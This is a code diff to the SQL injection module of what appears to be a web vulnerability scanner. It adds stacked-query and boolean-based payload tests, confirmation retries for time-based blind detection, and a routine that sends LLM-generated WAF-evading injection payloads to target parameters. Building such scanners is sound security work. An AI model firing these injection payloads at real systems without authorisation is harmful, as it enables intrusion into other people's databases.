@@ -81,6 +81,9 @@ class SQLiModule:
         # Test boolean-based SQLi
         self._test_boolean_based(url, method, param, value)
         
+        # Test stacked queries SQLi
+        self._test_stacked_queries(url, method, param, value)
+        
         # Test second-order SQLi
         self._test_second_order(url, method, param, value)
         
@@ -89,6 +92,9 @@ class SQLiModule:
         
         # Test WAF bypass payloads
         self._test_waf_bypass_payloads(url, method, param, value)
+
+        # LLM-generated adaptive payloads (if --local-llm active)
+        self._test_llm_payloads(url, method, param, value)
 
         # sqlmap deep scan (optional, requires sqlmap installed)
         if self.engine.config.get('modules', {}).get('sqlmap', False):
@@ -171,18 +177,28 @@ class SQLiModule:
                 # Response must take significantly longer than baseline
                 # and at least 4.8s (for SLEEP(5) payloads)
                 if elapsed >= 4.8 and elapsed > baseline_time + 4.0:
-                    from core.engine import Finding
-                    finding = Finding(
-                        technique="SQL Injection (Time-based Blind)",
-                        url=url,
-                        severity='HIGH',
-                        confidence=0.8,
-                        param=param,
-                        payload=payload,
-                        evidence=f"Response delayed by {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
-                    )
-                    self.engine.add_finding(finding)
-                    return
+                    # Confirmation retry: send the same payload again to reduce
+                    # false positives caused by transient network latency.
+                    try:
+                        confirm_start = time.time()
+                        self.requester.request(url, method, data=data)
+                        confirm_elapsed = time.time() - confirm_start
+                    except Exception:
+                        confirm_elapsed = 0
+
+                    if confirm_elapsed >= 4.8 and confirm_elapsed > baseline_time + 4.0:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="SQL Injection (Time-based Blind)",
+                            url=url,
+                            severity='HIGH',
+                            confidence=0.8,
+                            param=param,
+                            payload=payload,
+                            evidence=f"Response delayed by {elapsed:.2f}s, confirmed {confirm_elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
+                        )
+                        self.engine.add_finding(finding)
+                        return
                     
             except Exception as e:
                 if self.engine.config.get('verbose'):
@@ -258,42 +274,131 @@ class SQLiModule:
             
             baseline_len = len(baseline.text)
             
-            # Test true condition
-            true_payload = f"{value}' AND '1'='1"
-            true_data = {param: true_payload}
-            true_response = self.requester.request(url, method, data=true_data)
+            # Payload pairs: (true_payload, false_payload)
+            payload_pairs = [
+                (f"{value}' AND '1'='1", f"{value}' AND '1'='2"),
+                (f"{value}' AND 1=1 #", f"{value}' AND 1=2 #"),
+                (f"{value}' AND 'a'='a", f"{value}' AND 'a'='b"),
+            ]
             
-            # Test false condition
-            false_payload = f"{value}' AND '1'='2"
-            false_data = {param: false_payload}
-            false_response = self.requester.request(url, method, data=false_data)
-            
-            if true_response and false_response:
-                true_len = len(true_response.text)
-                false_len = len(false_response.text)
+            for true_payload, false_payload in payload_pairs:
+                # Test true condition
+                true_data = {param: true_payload}
+                true_response = self.requester.request(url, method, data=true_data)
                 
-                # If TRUE and FALSE responses differ significantly from each other,
-                # and TRUE response is closer to baseline, likely boolean-based SQLi
-                diff_true_false = abs(true_len - false_len)
-                diff_baseline_true = abs(baseline_len - true_len)
+                # Test false condition
+                false_data = {param: false_payload}
+                false_response = self.requester.request(url, method, data=false_data)
                 
-                if diff_true_false > 50 and diff_baseline_true < diff_true_false:
-                    from core.engine import Finding
-                    finding = Finding(
-                        technique="SQL Injection (Boolean-based Blind)",
-                        url=url,
-                        severity='HIGH',
-                        confidence=0.75,
-                        param=param,
-                        payload=true_payload,
-                        evidence=f"Response differs between TRUE ({true_len}) and FALSE ({false_len})",
-                    )
-                    self.engine.add_finding(finding)
+                if true_response and false_response:
+                    true_len = len(true_response.text)
+                    false_len = len(false_response.text)
+                    
+                    # If TRUE and FALSE responses differ significantly from each other,
+                    # and TRUE response is closer to baseline, likely boolean-based SQLi
+                    diff_true_false = abs(true_len - false_len)
+                    diff_baseline_true = abs(baseline_len - true_len)
+                    
+                    if diff_true_false > 50 and diff_baseline_true < diff_true_false:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="SQL Injection (Boolean-based Blind)",
+                            url=url,
+                            severity='HIGH',
+                            confidence=0.75,
+                            param=param,
+                            payload=true_payload,
+                            evidence=f"Response differs between TRUE ({true_len}) and FALSE ({false_len})",
+                        )
+                        self.engine.add_finding(finding)
+                        return
                     
         except Exception as e:
             if self.engine.config.get('verbose'):
                 print(f"{Colors.error(f'Boolean SQLi test error: {e}')}")
     
+    def _test_stacked_queries(self, url: str, method: str, param: str, value: str):
+        """Test for stacked query SQL injection.
+
+        Uses ``Payloads.SQLI_STACKED`` payloads and checks for both SQL
+        error signatures and time-based delays (for ``pg_sleep`` payloads).
+        """
+        payloads = Payloads.SQLI_STACKED
+
+        # Measure baseline response time for time-based detection
+        try:
+            baseline_data = {param: value}
+            baseline_start = time.time()
+            self.requester.request(url, method, data=baseline_data)
+            baseline_time = time.time() - baseline_start
+        except Exception:
+            baseline_time = 0
+
+        for payload in payloads:
+            try:
+                data = {param: payload}
+
+                start_time = time.time()
+                response = self.requester.request(url, method, data=data)
+                elapsed = time.time() - start_time
+
+                if not response:
+                    continue
+
+                # Check for SQL error signatures
+                response_text = response.text.lower()
+                detected_db = None
+
+                for db_type, signatures in self.error_signatures.items():
+                    for sig in signatures:
+                        if sig.lower() in response_text:
+                            detected_db = db_type
+                            break
+                    if detected_db:
+                        break
+
+                if detected_db:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="SQL Injection (Stacked Queries)",
+                        url=url,
+                        severity='CRITICAL',
+                        confidence=0.85,
+                        param=param,
+                        payload=payload,
+                        evidence=f"Stacked query triggered {detected_db} error",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+
+                # Check for time-based detection (pg_sleep payloads)
+                if 'pg_sleep' in payload and elapsed >= 4.8 and elapsed > baseline_time + 4.0:
+                    # Confirmation retry to reduce false positives
+                    try:
+                        confirm_start = time.time()
+                        self.requester.request(url, method, data=data)
+                        confirm_elapsed = time.time() - confirm_start
+                    except Exception:
+                        confirm_elapsed = 0
+
+                    if confirm_elapsed >= 4.8 and confirm_elapsed > baseline_time + 4.0:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="SQL Injection (Stacked Queries)",
+                            url=url,
+                            severity='CRITICAL',
+                            confidence=0.80,
+                            param=param,
+                            payload=payload,
+                            evidence=f"Stacked pg_sleep delayed response by {elapsed:.2f}s, confirmed {confirm_elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+
+            except Exception as e:
+                if self.engine.config.get('verbose'):
+                    print(f"{Colors.error(f'Stacked query SQLi test error: {e}')}")
+
     def _test_second_order(self, url: str, method: str, param: str, value: str):
         """Test for second-order SQL injection.
 
@@ -456,6 +561,58 @@ class SQLiModule:
             if os.path.isfile(candidate):
                 return candidate
         return ''
+
+    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
+        """Test with LLM-generated adaptive payloads.
+
+        Uses Qwen2.5-7B (when available via ``--local-llm``) to generate
+        context-aware SQL injection payloads tailored to the detected
+        technology stack and WAF.  Falls back silently when the LLM is
+        not loaded.
+        """
+        ai = getattr(self.engine, 'ai', None)
+        if ai is None:
+            return
+        llm_payloads = ai.get_llm_payloads('sqli', param)
+        if not llm_payloads:
+            return
+
+        for payload in llm_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+
+                response_text = response.text.lower()
+
+                # Check for SQL errors (same logic as error-based)
+                detected_db = None
+                for db_type, signatures in self.error_signatures.items():
+                    for sig in signatures:
+                        if sig.lower() in response_text:
+                            detected_db = db_type
+                            break
+                    if detected_db:
+                        break
+
+                if detected_db:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique=f"SQL Injection - AI-generated ({detected_db.upper()})",
+                        url=url,
+                        severity='HIGH',
+                        confidence=0.85,
+                        param=param,
+                        payload=payload,
+                        evidence=f"AI payload triggered {detected_db} error",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+
+            except Exception as e:
+                if self.engine.config.get('verbose'):
+                    print(f"{Colors.error(f'LLM SQLi test error: {e}')}")
 
     def _test_sqlmap(self, url: str, method: str, param: str, value: str):
         """Run sqlmap against a specific parameter for deep SQL injection testing.
